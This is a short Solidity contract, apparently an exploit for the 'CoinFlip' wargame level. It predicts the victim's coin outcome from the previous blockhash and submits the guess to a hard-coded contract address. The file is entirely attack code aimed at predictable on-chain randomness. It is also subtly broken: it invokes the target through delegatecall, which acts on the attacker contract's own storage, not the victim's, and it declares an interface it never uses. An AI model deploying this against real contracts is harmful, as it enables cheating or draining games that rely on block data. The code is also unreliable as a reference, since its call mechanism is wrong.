// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

interface Flip {
   function flip(bool) external returns(bool);
}

contract CoinFlip {
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function flip() public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    address _contract = 0x0a1a3E6f8e3fb2c52C68cC0d87D68b9ab339d5a7;
    (bool success, bytes memory data) = _contract.delegatecall(
      abi.encodeWithSignature("flip(bool)", side)
    );
    return success;
  }
}